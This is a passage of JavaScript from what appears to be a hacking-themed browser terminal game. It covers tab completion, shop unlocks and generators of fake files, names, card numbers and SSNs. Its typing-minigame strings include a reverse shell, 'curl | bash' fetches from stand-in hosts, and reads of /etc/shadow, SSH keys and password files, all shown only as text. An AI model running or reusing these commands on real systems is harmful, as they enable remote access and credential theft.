        const existing = document.getElementById('shop-modal');
        if (existing) {
          existing.parentNode.removeChild(existing);
          // reset the shop button visual state
          try { sb.textContent = 'Shop'; sb.classList.remove('shop-open'); } catch(e){}
        } else openShopModal();
      } catch(e){}
    });
  } catch(e) {}

  // connection state when connected to a hacked machine
  let connection = null; // {target: string}

  function handleTabCompletion() {
    const val = inputEl.value;
    const caret = inputEl.selectionStart || 0;
    // only complete the first token
    const before = val.slice(0, caret);
    const parts = before.split(/\s+/);
    const token = parts[0] || '';

    if (!token) return;

    // If completing a second token for 'cat' or 'download', offer filenames
  const wantHackCompletion = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_hack')) ? true : false;
  if (parts.length > 1 && (token.toLowerCase() === 'cat' || token.toLowerCase() === 'download' || token.toLowerCase() === 'connect' || (wantHackCompletion && token.toLowerCase() === 'hack'))) {
      const prefix = parts[1] || '';
      const candidates = [];
      // remote download/cat completion: from host files
      if (connection && (token.toLowerCase() === 'download' || token.toLowerCase() === 'cat')) {
        const files = ensureFilesMap();
        const partsTarget = connection.target ? connection.target.split('  ') : [];
        const host = connection.domain || (partsTarget[1] || partsTarget[0]) || 'unknown';
        Array.prototype.push.apply(candidates, (files[host] || generateFilesForHost((partsTarget[2]||'Unknown').trim(), host)).map(f => f.name));
      }
      // only support remote cat completion when connected
      if (!connection && token.toLowerCase() === 'cat') return;
      // connect completion: complete from hacked machines (owned)
      if (token.toLowerCase() === 'connect') {
        // only offer connect completions if player purchased unlock_connect
        const hasConnect = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_connect')) ? true : false;
        if (!hasConnect) {
          // no completions available
          return;
        }
        window._game = window._game || {};
        const owned = window._game.owned || [];
        // owned entries are strings like 'ip  host  cat'
        Array.prototype.push.apply(candidates, owned.map(o => {
          const partsO = o.split('  ');
          return (partsO[1] || partsO[0] || '').trim();
        }));
      }
      // hack completion: complete from scanHistory
      if (token.toLowerCase() === 'hack' && wantHackCompletion) {
        window._game = window._game || {};
        const hist = window._game.scanHistory || [];
        Array.prototype.push.apply(candidates, hist.map(h => {
          const partsH = h.split('  ');
          return (partsH[1] || partsH[0] || '').trim();
        }));
      }
      // no CLI purchase completion (shop is UI-driven)

      const key = `${token}:${prefix}`;
      if (completionState.lastInput !== key) {
        const matches = candidates.filter(c => c.toLowerCase().startsWith(prefix.toLowerCase()));
        completionState = { lastInput: key, matches, index: 0 };
        if (matches.length === 0) return;
        if (matches.length === 1) {
          const pick = matches[0];
          const suffix = val.slice(caret) || '';
          inputEl.value = token + ' ' + pick + suffix;
          const newPos = (token + ' ' + pick).length;
          inputEl.setSelectionRange(newPos, newPos);
          return;
        }
        // multiple matches: compute longest common prefix among matches and insert up to divergence
        const lowerMatches = matches.map(m => m.toLowerCase());
        let lcp = lowerMatches[0];
        for (let i = 1; i < lowerMatches.length; i++) {
          const s = lowerMatches[i];
          let j = 0;
          const maxj = Math.min(lcp.length, s.length);
          while (j < maxj && lcp[j] === s[j]) j++;
          lcp = lcp.slice(0, j);
          if (!lcp) break;
        }
        if (lcp && lcp.length > prefix.length) {
          // fill the common prefix portion
          const fill = matches[0].slice(0, lcp.length);
          const suffix = val.slice(caret) || '';
          inputEl.value = token + ' ' + fill + suffix;
          const newPos = (token + ' ' + fill).length;
          inputEl.setSelectionRange(newPos, newPos);
          // update stored matches so subsequent Tab presses will show matches list
          completionState.matches = matches;
          return;
        }
        // no longer common prefix beyond current prefix — show matches
        appendLine('Matches: ' + matches.join(', '), 'muted');
        return;
      }

      // If we are already in a completion state, cycle through matches as before
      if (completionState.matches.length > 0) {
        const pick = completionState.matches[completionState.index % completionState.matches.length];
        completionState.index++;
        const suffix = val.slice(caret) || '';
        inputEl.value = token + ' ' + pick + suffix;
        const newPos = (token + ' ' + pick).length;
        inputEl.setSelectionRange(newPos, newPos);
      }
      return;
    }

    // new completion run for commands (first token)
    if (completionState.lastInput !== token) {
      let available;
      if (connection) {
        available = ['help','exit','find','cat','download'];
      } else {
        // build available commands dynamically so purchases immediately enable completion
        available = ['help','scan','list-scan','list-owned','exit','download','list-downloads'];
        try {
          const hasHack = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_hack')) ? true : false;
          const hasConnect = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_connect')) ? true : false;
          if (hasHack && !available.includes('hack')) available.push('hack');
          if (hasConnect && !available.includes('connect')) available.push('connect');
          // enable tab-complete for touch-grass when purchased
          try {
            const hasTouch = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='touch_grass')) ? true : false;
            if (hasTouch && !available.includes('touch-grass')) available.push('touch-grass');
          } catch(e) {}
        } catch(e) {}
      }
      const matches = available.filter(c => c.startsWith(token.toLowerCase()));
      completionState = { lastInput: token, matches, index: 0 };
      if (matches.length === 0) return;
      if (matches.length === 1) {
        inputEl.value = matches[0] + (val.slice(caret) || '');
        inputEl.setSelectionRange(matches[0].length, matches[0].length);
        return;
      }
      // if multiple matches, show them
      appendLine('Matches: ' + matches.join(', '), 'muted');
      return;
    }

    // cycle through command matches
    if (completionState.matches.length > 0) {
      const pick = completionState.matches[completionState.index % completionState.matches.length];
      completionState.index++;
      inputEl.value = pick + (val.slice(caret) || '');
      inputEl.setSelectionRange(pick.length, pick.length);
    }
  }

  // --- Filesystem and file-content generation for hacked hosts ---
  // store generated files per-host in window._game.files as { host: [ {name,content}, ... ] }
  function ensureFilesMap() {
    window._game = window._game || {};
    window._game.files = window._game.files || {};
    return window._game.files;
  }

  // create a large pool of filename components to generate hundreds of distinct names
  const FN_ADJS = ['ancient','private','secret','draft','final','confidential','personal','public','urgent','old','archive','tmp','legacy','staged','release','vip','staff','guest','sys','internal','ops','financial','billing','media','design','proto','beta','alpha','secure','hidden','classified','topsecret','experimental','snapshot','autosave','v2','v3','preview','locked','shared','local','remote','cached','indexed','orphan'];
  const FN_NOUNS = ['report','notes','todo','contacts','list','backup','dump','config','credentials','secrets','passwords','clients','visitors','schedule','plan','blueprint','schematic','invoice','payroll','roster','manifest','diary','log','archive','research','thesis','proposal','menu','map','drawing','brief','minutes','specs','readme','license','contract','inventory','transactions','ledger','snapshot','cache','db','users','sessions','feeds','emails'];
  const EXTENSIONS = ['.txt','.md','.csv','.json','.log','.pdf','.docx','.xls','.db','.bin','.enc','.yaml','.yml','.cfg','.ini','.tar.gz','.zip','.jpg','.png','.psd','.bak','.old','.save','.conf','.ini','.service'];

  // global counter to create many unique filenames across the entire session
  let globalFileCounter = 0;
  const MAX_GLOBAL_FILES = 200000; // practical upper bound, allows many unique names across sessions

  function makeUniqueFilename(category) {
    // create a highly varied filename using the global counter so names don't repeat
    const adj = FN_ADJS[globalFileCounter % FN_ADJS.length];
    const noun = FN_NOUNS[Math.floor(globalFileCounter / FN_ADJS.length) % FN_NOUNS.length];
    const ext = EXTENSIONS[globalFileCounter % EXTENSIONS.length];
    const num = globalFileCounter;
    globalFileCounter = (globalFileCounter + 1) % MAX_GLOBAL_FILES;
    // include category hint rarely
  const hint = (Math.random() < 0.45 && category) ? ('_' + category.toLowerCase().replace(/[^a-z0-9]+/g,'').slice(0,8)) : '';
  // sometimes add extra entropy suffix
  const suf = Math.random() < 0.25 ? ('_' + Math.random().toString(36).slice(2,8)) : '';
    return `${adj}_${noun}_${num}${hint}${ext}`;
  }

  function randChoice(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
  function randInt(min, max) { return Math.floor(Math.random()*(max-min+1))+min; }

  // generate a very long l337 bash-style command (>=200 chars) for the FBI minigame
  function makeLongLeetCommand() {
    const parts = [
      "sudo su -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'",
      "openssl enc -aes-256-cbc -in /dev/null -out /tmp/pwned.enc -k $(cat /etc/passwd | sha256sum | cut -c1-16)",
      "curl -s http://mirror.example.com/payload.sh | bash",
      "cat /var/log/auth.log | grep -i failed | awk '{print $1,$2,$3,$11}' | sort | uniq -c | sort -nr",
      "dd if=/dev/urandom bs=64 count=64 | base64 | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1",
      "for i in $(seq 1 128); do printf '%02x' $((RANDOM%256)); done | xxd -r -p >/tmp/blk.bin",
      "bash -c 'echo \"$(date) PWNED\" >> /var/log/syslog; sleep 0.01'",
      "tar czf - /etc | openssl enc -aes-256-cbc -e -k 0xdeadbeef | base64 -w0"
    ];
    let s = '';
    // make FBI long commands even longer for extra challenge
    while (s.length < 260) {
      s += parts[Math.floor(Math.random()*parts.length)] + ' ; ';
    }
    // remove trailing separators and whitespace
    s = s.replace(/(?:\s*;\s*)+$/g, '').trim();
    // remove any accidental newlines and compress spaces
    s = s.replace(/\s+/g, ' ').trim();
    // sprinkle l33t substitutions
    s = s.replace(/e/g,'3').replace(/a/g,'4').replace(/o/g,'0').replace(/i/g,'1');
    // ensure final string doesn't end with a space or semicolon
    s = s.replace(/(?:\s*;\s*)+$/g, '').trim();
    return s;
  }

  // generate a shorter but still challenging FBI command (~100 chars) for display and wrapping
  function makeFbiCommand() {
    const parts = [
      "sudo bash -c 'curl -sS http://payload.example/$(date +%s) | bash'",
      "openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/shadow.enc -k $(whoami)",
      "for i in $(seq 1 32); do printf '%02x' $((RANDOM%256)); done | xxd -r -p >/tmp/p.bin",
      "cat /var/log/auth.log | tail -n 200 | gzip -c | base64 -w0 > /tmp/auth.b64"
    ];
    let s = '';
    // make the FBI-short variant a bit longer so it's tougher when used as the shortened fasthands fallback
    while (s.length < 140) {
      s += parts[Math.floor(Math.random()*parts.length)] + ' ; ';
    }
    // remove trailing semicolons/newline artifacts
    s = s.replace(/(?:\s*;\s*)+$/g, '').trim();
    // compress whitespace and make single line
    s = s.replace(/\s+/g, ' ').trim();
    s = s.replace(/e/g,'3').replace(/a/g,'4').replace(/o/g,'0').replace(/i/g,'1');
    // ensure no trailing space or separator
    s = s.replace(/(?:\s*;\s*)+$/g, '').trim();
    return s.substring(0, 160).trim();
  }

  // build a large pool (~100) of varied, plausible bash-style commands for normal hacks
  // Simpler, shorter commands using real tools and common filepaths to make the minigame easier
  function buildHackCommandPool(host, ip) {
    host = host || 'target.local';
    ip = ip || '10.0.0.1';
    const ports = [22, 80, 443, 8080, 3306, 5432, 4444];
    const nums = () => Math.floor(Math.random()*9000)+100;
    const files = ['credentials.txt','authorized_keys','backup.tar.gz','users.csv','auth.log','secrets.txt'];

    const templates = [
      `cat /etc/passwd`,
      `sudo cat /etc/shadow || true`,
      `cat /var/log/syslog | tail -n 200`,
      `tail -n 200 /var/log/auth.log`,
      `grep -i password /etc -R 2>/dev/null | head -n 20`,
      `ls -la /home/{user}`,
      `tar -czf /tmp/backup_{num}.tgz /var/www 2>/dev/null`,
      `openssl rsa -in ~/.ssh/id_rsa -pubout 2>/dev/null`,
      `ssh {user}@{host} 'cat ~/.ssh/authorized_keys'`,
      `scp {user}@{host}:/etc/passwd /tmp/passwd_{num} 2>/dev/null || true`,
      `nc -vz {ip} {port} 2>/dev/null || true`,
      `find /var/www -maxdepth 3 -name '*.php' | head -n 20`,
      `grep -R "secret\|api_key\|password" /etc /var/www 2>/dev/null | head -n 20`,
      `sed -n '1,40p' /etc/ssh/sshd_config`,
      `awk -F: '{print $1":"$3":"$6}' /etc/passwd | head -n 30`,
      `head -n 50 /etc/hosts`,
      `stat -c '%n %s %y' /var/log/syslog 2>/dev/null || true`,
      `du -sh /var/www 2>/dev/null || true`,
      `strings /etc/issue | head -n 8`,
      `ps aux | grep -E 'sshd|nginx|apache' | head -n 12`
    ];

    const pool = [];
    for (let i = 0; pool.length < 100 && i < 1000; i++) {
      const t = templates[i % templates.length];
      // lightweight replacements to keep commands valid-looking
      const cmd = t.replace(/\{host\}/g, host)
                   .replace(/\{ip\}/g, ip)
                   .replace(/\{port\}/g, String(ports[i % ports.length] || 22))
                   .replace(/\{num\}/g, String(nums()))
                   .replace(/\{file\}/g, files[i % files.length])
                   .replace(/\{user\}/g, (Math.random() < 0.5) ? 'root' : 'www-data');

      // add occasional small, harmless noise to vary the strings
      const noise = (i % 7 === 0) ? ` ; echo probe_${nums()} >/tmp/probe.log` : '';
      let single = (cmd + noise).replace(/\s+/g, ' ').trim();

      // Remove any heredoc markers or explicit newlines if present
      single = single.replace(/<<\s*'?\w+'?/g, ' ');

      // ensure commands are short and not too hard
  const MAX_NORMAL_CMD_LEN = 48;
      if (single.length > MAX_NORMAL_CMD_LEN) {
        // try to cut at a logical separator
        const sepMatch = single.substring(0, MAX_NORMAL_CMD_LEN).lastIndexOf(';');
        if (sepMatch > 8) {
          single = single.substring(0, sepMatch).trim();
        } else {
          single = single.substring(0, MAX_NORMAL_CMD_LEN).trim();
        }
      }
      single = single.replace(/(?:\s*;\s*)+$/g, '').trim();
      // avoid zero-length entries
      if (single.length >= 6) pool.push(single);
    }

    // de-duplicate and ensure pool has 100 entries
    const uniq = [...new Set(pool)];
    while (uniq.length < 100) uniq.push(uniq[uniq.length % uniq.length] + ` ; echo extra_${nums()}`);
    return uniq.slice(0,100);
  }

  // build a single plausible filename
  function buildFilename(category) {
    // bias some nouns based on category keywords
    const c = (category || '').toLowerCase();
    let noun = randChoice(FN_NOUNS);
    if (c.includes('library')) noun = randChoice(['catalog','overdue_list','book_index','rarities']);
    if (c.includes('hospital') || c.includes('clinic')) noun = randChoice(['patient_records','med_stock','shift_roster','treatment_log']);
    if (c.includes('bank') || c.includes('atm') || c.includes('payment')) noun = randChoice(['accounts','transactions','vault','ledger','customers']);
    if (c.includes('school') || c.includes('university')) noun = randChoice(['grades','thesis','course_materials','roster']);
    if (c.includes('iot') || c.includes('router')) noun = randChoice(['wifi_creds','device_log','firmware','config']);

    const adj = Math.random() < 0.4 ? (randChoice(FN_ADJS) + '_') : '';
    const num = Math.random() < 0.3 ? ('_' + randInt(1,9999)) : '';
    const ext = randChoice(EXTENSIONS);
    return `${adj}${noun}${num}${ext}`;
  }

  // Generate human-like fake data where needed
  function fakeName() {
    const first = ['Alex','Sam','Jordan','Taylor','Casey','Robin','Morgan','Riley','Jamie','Chris','Pat','Lee','Dana','Avery'];
    const last = ['Smith','Johnson','Brown','Taylor','Anderson','Thomas','Jackson','White','Harris','Martin','Thompson','Garcia'];
    return `${randChoice(first)} ${randChoice(last)}`;
  }

  function fakeAddress() {
    return `${randInt(100,9999)} ${randChoice(['Main St','Oak Ave','Maple Rd','Pine Ln','Market St','Elm St','Sunset Blvd'])}, ${randChoice(['Springfield','Riverton','Lakeview','Hillside','Greendale'])}, ${randChoice(['CA','NY','TX','WA','FL','IL'])} ${randInt(10000,99999)}`;
  }

  function fakePhone() { return `(${randInt(200,999)}) ${randInt(200,999)}-${randInt(1000,9999)}`; }

  function fakeCardNumber() {
    // generate Visa/Master-like numbers (only format, not valid for real use)
    const parts = [];
    for (let i=0;i<4;i++) parts.push(String(randInt(1000,9999)));
    const exp = `${randInt(1,12).toString().padStart(2,'0')}/${randInt(24,30)}`;
    const cvv = String(randInt(100,999));
    return `${parts.join(' ')} | EXP: ${exp} | CVV: ${cvv}`;
  }

  function fakeSSN() {
    return `${randInt(100,899)}-${randInt(10,99)}-${randInt(1000,9999)}`;
  }

  // generate content text based on filename and category
  function generateFileContent(filename, category) {
    const name = filename.toLowerCase();
    // small helper to inject entertaining flavor lines
    function flavor() {
      return randChoice([
        'I totally forgot to erase this... oops.',
        'Not safe for work, but secretly hilarious.',
        'You weren\'t supposed to see this.',
        'This file contains a really embarrassing story involving karaoke.',
        'Contains spoilers for an ancient sitcom.',
        'Hand-crafted nonsense for your amusement.'
      ]);
    }
    const cat = (category || 'general').toLowerCase();
    // category-based header to bias content generation
    function categoryHeader() {
      if (cat.includes('hospital') || cat.includes('clinic')) return `// ${cat.toUpperCase()} - PATIENT DATA (redacted)`;
      if (cat.includes('bank') || cat.includes('atm') || cat.includes('payment') || cat.includes('financial')) return `// ${cat.toUpperCase()} - TRANSACTION LEDGER`;
      if (cat.includes('school') || cat.includes('university')) return `// ${cat.toUpperCase()} - ACADEMIC RECORDS`;
      if (cat.includes('government') || cat.includes('military')) return `// ${cat.toUpperCase()} - OFFICIAL LOGS`;
      if (cat.includes('grandma') || cat.includes('personal')) return `// PERSONAL NOTES`;
      if (cat.includes('iot') || cat.includes('router') || cat.includes('smart')) return `// DEVICE CONFIG`;
      return `// ${cat.toUpperCase()} - DATA`;
    }
    // TODO-style lists
    if (name.includes('todo') || name.includes('tasks') || name.includes('task')) {
      const cnt = randInt(3,8);
      let out = 'TODO:\n';
      for (let i=1;i<=cnt;i++) out += `- ${randChoice(['investigate','patch','backup','audit','contact','deploy','test','remove','sing to the server','buy coffee for ops'])} ${randChoice(['service','db','module','endpoint','user','the server cat'])} ${i}\n`;
      out += '\n' + flavor();
      return out;
    }

    // contacts/directory
    if (name.includes('contact') || name.includes('contacts') || name.includes('address') || name.includes('client')) {
      const cnt = randInt(3,7);
      let out = 'Name,Address,Phone,Email\n';
      for (let i=0;i<cnt;i++) out += `${fakeName()},${fakeAddress()},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['example.com','corp.net','service.io'])}\n`;
      out += '\n' + flavor();
      return out;
    }

    // credentials/secrets
    if (name.includes('credential') || name.includes('password') || name.includes('credentials') || name.includes('secrets') || name.includes('wifi_creds')) {
      let out = categoryHeader() + '\n';
      const users = randInt(2,8);
      for (let i=0;i<users;i++) out += `${randChoice(['admin','root','operator','user','svc','svc_acc','web'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,12)}\n`;
      if (name.includes('wifi') || cat.includes('iot')) out += `SSID: ${randChoice(['CorpNet','GuestWiFi','OfficeNet','IoT','HomeSSID'])}\nPASS: ${Math.random().toString(36).slice(2,12)}\n`;
      if (Math.random() < 0.25) out += `NOTE: backup key stored in /etc/keys/${randInt(1,99)}.key\n`;
      out += '\n' + flavor();
      return out;
    }

    // billing/financial -> include fake card numbers or account entries (category-aware)
    if (name.includes('account') || name.includes('transactions') || name.includes('billing') || name.includes('invoice') || name.includes('payroll') || cat.includes('financial') ) {
      let out = categoryHeader() + '\n';
      const rows = randInt(8,40);
      for (let i=0;i<rows;i++) out += `${randInt(2018,2025)}-${randInt(1,12).toString().padStart(2,'0')}-${randInt(1,28).toString().padStart(2,'0')},${randChoice(['DEBIT','CREDIT','REFUND','FEE'])},$${(Math.random()*10000).toFixed(2)}\n`;
      if (Math.random() < 0.7) out += `\nCC: ${fakeCardNumber()}\n`;
      if (Math.random() < 0.6) out += `SSN: ${fakeSSN()}\n`;
      if (Math.random() < 0.35) out += `WALLET: 0x${Math.random().toString(16).slice(2,38)}\n`;
      if (Math.random() < 0.25) out += `ACCOUNT NOTES: ${randChoice(['reconciled','overdue','flagged','auto-pay enabled','manual review required'])}\n`;
      out += '\n' + flavor();
      return out;
    }

    // diary/notes/embarrassing personal notes
    if (name.includes('diary') || name.includes('journal') || name.includes('secret') || name.includes('personal') || name.includes('confidential') || name.includes('secrets.txt')) {
      return `Private note:\nI really shouldn't have written this down but I did. ${randChoice(['I cried','I danced','I sang karaoke','I accidentally texted my boss','I ate an entire cake','I dated a toaster'])} on ${new Date().toLocaleDateString()}.\n\n${flavor()}\n`;
    }

    // blueprints/schematic
    if (name.includes('blueprint') || name.includes('schematic') || name.includes('map') || name.includes('drawing') || cat.includes('industrial') ) {
      const lines = [];
      lines.push('--- SCHEMATIC ---');
      lines.push(`Project: ${filename}`);
      const w = randInt(20,40);
      for (let y=0;y<randInt(6,12);y++) {
        let row = '';
        for (let x=0;x<w;x++) row += Math.random() < 0.07 ? '#' : (Math.random() < 0.05 ? '+' : ' ');
        lines.push(row);
      }
      lines.push('--- END SCHEMATIC ---');
      return lines.join('\n');
    }

    // vip schedules / plans
    if (name.includes('vip') || name.includes('visit') || name.includes('schedule') || name.includes('agenda')) {
      let out = categoryHeader() + '\nVIP Visit Schedule:\n';
      const items = randInt(3,10);
      for (let i=0;i<items;i++) out += `${randInt(8,17)}:00 - ${randChoice(['Tour','Meeting','Lunch','Press','Inspection','Site Walk','Confidential Briefing'])} with ${fakeName()}\n`;
      if (Math.random() < 0.3) out += `SECURITY NOTE: ${randChoice(['escort required','badge needed','clearance level 3'])}\n`;
      return out;
    }
  // If filename explicitly suggests a short piece type, create that type
    // Haiku
    function makeHaiku() {
      const five = ['silent server hum', 'neon night rain', 'old router blink', 'coffee on desk', 'lonely packet'];
      const seven = ['midnight log rolls on', 'keys clack under moonlight', 'packets search for home', 'dreams of copper lines', 'laughter in the server room'];
      return `${randChoice(five)}\n${randChoice(seven)}\n${randChoice(five)}`;
    }

    function makeShortStory() {
      const chars = ['Jordan','Alex','Sam','Morgan','Riley','Casey','Taylor','Robin','Dana','Avery','Jamie','Chris'];
      const places = ['the datacenter','an abandoned office','a sleepy ISP','a rooftop cafe','a dusty archive'];
      const acts = ['stumbled on a secret','found a forgotten floppy','decoded a half-remembered password','accidentally triggered a confetti alarm','discovered a love letter in logs'];
      const endings = ['and everything changed.','but no one believed them.','and they laughed until dawn.','and then the server winked.','and it became legend.'];
      const lines = randInt(3,8);
      let out = `Once, ${randChoice(chars)} at ${randChoice(places)} ${randChoice(acts)}.`;
      for (let i=0;i<lines;i++) out += ` ${randChoice(['They', 'It', 'Someone', 'A fox'])} ${randChoice(['whispered','ran','laughed','typed','slept'])} ${randChoice(['softly','wildly','recklessly','silently'])}.`;
      out += ' ' + randChoice(endings);
      return out;
    }

    function makeNumberBlob() {
      // produce a file containing only numbers or a long list of numbers
      if (Math.random() < 0.5) return String(randInt(0, Number.MAX_SAFE_INTEGER));
      const rows = randInt(5,50);
      let out = '';
      for (let i=0;i<rows;i++) out += String(randInt(0,99999999)) + (i<rows-1 ? '\n' : '');
      return out;
    }

    function makeTable(kind) {
      if (kind === 'employees') {
        const rows = randInt(3,12);
        let out = 'id,name,position,phone,email\n';
        for (let i=0;i<rows;i++) out += `${i+1},${fakeName()},${randChoice(['Engineer','Manager','Clerk','Technician','Analyst'])},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['corp.net','example.com','office.org'])}\n`;
        return out;
      }
      if (kind === 'parts') {
        const rows = randInt(5,20);
        let out = 'part_id,description,qty,location\n';
        for (let i=0;i<rows;i++) out += `${1000+i},${randChoice(['bolt','motherboard','sensor','fan','cable','panel'])},${randInt(1,200)},${randChoice(['A1','B2','C3','Dock','Shelf'])}\n`;
        return out;
      }
      // logistics/manifest
      const rows = randInt(4,16);
      let out = 'item,weight,eta,notes\n';
      for (let i=0;i<rows;i++) out += `${randChoice(['Crate','Pallet','Box','Envelope'])},${(Math.random()*50).toFixed(2)}kg,${randInt(1,14)}d,${randChoice(['fragile','handle with care','urgent','standard'])}\n`;
      return out;
    }

    // If filename suggests type
    if (name.includes('haiku') || name.endsWith('.haiku')) return makeHaiku();
    if (name.includes('story') || name.includes('tale') || name.includes('short') || name.endsWith('.story')) return makeShortStory();
    if (name.includes('number') || name.includes('numbers') || name.endsWith('.num')) return makeNumberBlob();
    if (name.includes('employee') || name.includes('employees') || name.includes('staff') || name.includes('roster')) return makeTable('employees');
    if (name.includes('part') || name.includes('parts') || name.includes('inventory') || name.includes('manifest')) return makeTable('parts');
    if (name.includes('logistics') || name.includes('manifest')) return makeTable('logistics');

    // fallback: randomly pick a generator to maximize variety (and bias by category)
    const pick = Math.random();
    let content;
    // bias pick by category
    let bias = 0;
    if (cat.includes('poem') || name.includes('haiku')) bias = -0.2;
    if (cat.includes('story') || name.includes('story')) bias = -0.1;
    const p = Math.min(0.99, Math.max(0, pick + bias));
    if (p < 0.12) content = makeHaiku();
    else if (p < 0.35) content = makeShortStory();
    else if (p < 0.55) content = makeTable(randChoice(['employees','parts','logistics']));
    else if (p < 0.70) content = makeNumberBlob();
    else if (p < 0.82) content = `WALLET: 0x${Math.random().toString(16).slice(2,38)}`;
    else if (p < 0.92) content = (() => { // personal note / todo
      const t = randInt(2,7); let o=''; for (let i=0;i<t;i++) o += `- ${randChoice(['remember to call mom','pick up milk','commit patch','fix bug','write apology','practice karaoke','replace keyboard'])}\n`; return o; })();
    else content = (() => { // contacts or credentials
      if (Math.random() < 0.5) return (function(){let o='Name,Phone,Email\n'; for(let i=0;i<randInt(2,10);i++) o+=`${fakeName()},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['example.com','mail.net','corp.net'])}\n`; return o; })();
      return (function(){let o=''; for(let i=0;i<randInt(2,8);i++) o+=`${randChoice(['admin','root','svc','user','operator'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,12)}\n`; return o; })();
    })();

    // sometimes add a dramatic flavor or a sensitive line
    if (Math.random() < 0.3) {
      if (Math.random() < 0.5) content += `\n\n${flavor()}`;
      if (Math.random() < 0.25) content += `\n\nSSN: ${fakeSSN()}`;
      if (Math.random() < 0.25) content += `\nCC: ${fakeCardNumber()}`;
    }

    // ensure content uniqueness across the session
    window._game = window._game || {};
    window._game._usedFileContents = window._game._usedFileContents || new Set();
    let finalContent = content;
    let tries2 = 0;
    while (window._game._usedFileContents.has(finalContent) && tries2 < 6) {
      finalContent += `\nUID:${Math.random().toString(36).slice(2,10)}`;
      tries2++;
    }
    window._game._usedFileContents.add(finalContent);
    return finalContent;
  }

  // create and store 2-8 files for a host (if not already present)
  // Each host is assigned a single category (provided) and will have 2-8 files tailored to that category.
  function generateFilesForHost(category, host) {
    const files = ensureFilesMap();
    const key = host || 'unknown';
    if (files[key] && files[key].length > 0) return files[key];

    const cat = (category || 'General').toString();

    // Build a master pool of 100 realistic filenames (created once per session)
    window._game = window._game || {};
    if (!window._game._masterFilenamePool) {
      const prefixes = ['annual','quarterly','final','draft','confidential','internal','release','client','employee','patient','transaction','invoice','backup','system','user','config','policy','incident','report','notes','minutes','contract','manual','spec','design','proposal','budget','audit','credentials','secrets','resume','cover','press','migration','deployment','changelog','diary','logbook','archive','manifest','catalog','menu','schedule','itinerary','plan','story','poem','letter','email','wallet'];
      const middles = ['financial','operations','hr','marketing','engineering','research','sales','support','legal','security','comms','it','network','cloud','backup','billing','payroll','inventory','transcripts','grades','thesis','grant','proposal','study','experiment','protocol','dataset','analysis','summary','overview','policy','procedure','roadmap','blueprint','specs','config','credentials','database','schema','users','sessions','logs','errors','stack','core','frontend','backend','migration','release','notes'];
      const suffixes = ['report','summary','records','data','list','notes','ledger','statement','statement','archive','doc','memo','journal','diary','log','manual','guide','howto','instructions','readme','overview','plan','itinerary','agenda','minutes','transcripts','contract','agreement','policy','procedure','spec','specification','design','schema','dump','backup'];
      const exts = ['.pdf','.docx','.xlsx','.csv','.txt','.log','.md','.json','.yaml','.sql','.tar.gz','.zip','.bin','.cfg','.ini','.eml','.msg','.rtf','.psd'];

      const pool = new Set();
      // generate until we have 100 distinct, realistic-looking filenames
      while (pool.size < 100) {
        const p = randChoice(prefixes);
        const m = randChoice(middles);
        const s = randChoice(suffixes);
        const ext = randChoice(exts);
        // sometimes insert a human name or year to make it realistic
        const useName = Math.random() < 0.25;
        const namePart = useName ? fakeName().toLowerCase().replace(/[^a-z0-9]+/g, '_') : '';
        const year = Math.random() < 0.25 ? (`_${randInt(2018,2025)}`) : '';
        let fname = `${p}_${m}_${s}`;
        if (namePart) fname += `_${namePart}`;
        fname += year + ext;
        // normalize double underscores
        fname = fname.replace(/__+/g, '_');
        pool.add(fname);
      }
      window._game._masterFilenamePool = Array.from(pool);
    }

    // ensure a large and diverse category list (50+ categories)
    if (!window._game._categories) {
      window._game._categories = [
        'Finance','HR','Engineering','Research','Legal','Government','Military','Healthcare','Hospitality','Retail','Supermarket','Gaming','Media','Publishing','Education','University','Library','Data Center','Cloud Provider','ISP','Telecom','IoT','Router','Consumer Electronics','Automotive','Aerospace','NASA','Research Lab','Pharmacy','Clinic','Banking','ATM','Payment Processor','Museum','Archive','Municipal','Transit','Power Grid','Factory','Manufacturing','Logistics','Warehouse','Hotel','Restaurant','Restaurant Chain','Startup','Large Enterprise','Small Business','Personal','Home','DevOps','Security','Incident Response','Marketing','Sales'
      ];
    }

    // helper to generate long realistic content depending on filename/category
    function generateLargeContent(name, category) {
      const cat = (category || '').toLowerCase();
      // helper paragraph generator
      function paragraph(sentences) {
        const pool = [
          'This document was produced as part of routine operations and contains aggregated entries collected from multiple sources.',
          'Details have been redacted where appropriate to protect privacy, but the structure and metadata remain intact for analysis.',
          'The following content includes itemized entries, narrative summaries, and numbered observations relevant to the subject matter.',
          'Readers should note timestamps and author attributions where present; these fields were auto-generated for simulation purposes.',
          'Where numeric identifiers appear they represent obfuscated internal IDs and are not intended to match live systems.'
        ];
        let out = '';
        for (let i=0;i<sentences;i++) out += (randChoice(pool) + ' ');
        return out.trim();
      }

      // big CSV generator
      function bigCsv(headers, rows) {
        let out = headers.join(',') + '\n';
        for (let i=0;i<rows;i++) {
          const row = headers.map(h => {
            if (h.toLowerCase().includes('id')) return randInt(1000,999999);
            if (h.toLowerCase().includes('email')) return `${fakeName().toLowerCase().replace(/ /g,'.')}@example.com`;
            if (h.toLowerCase().includes('amount') || h.toLowerCase().includes('balance') || h.toLowerCase().includes('price')) return (Math.random()*10000).toFixed(2);
            if (h.toLowerCase().includes('date')) return `${randInt(2018,2025)}-${randInt(1,12).toString().padStart(2,'0')}-${randInt(1,28).toString().padStart(2,'0')}`;
            return `${randChoice(['alpha','beta','gamma','delta'])}_${randInt(1,9999)}`;
          });
          out += row.join(',') + '\n';
        }
        return out;
      }

      // long research paper-like content
      function researchPaper() {
        let out = `Title: ${name}\nAuthors: ${fakeName()}, ${fakeName()}\nAbstract:\n` + paragraph(6) + '\n\n';
        const sections = ['Introduction','Methods','Results','Discussion','Conclusion','References'];
        sections.forEach(s => {
          out += s + '\n';
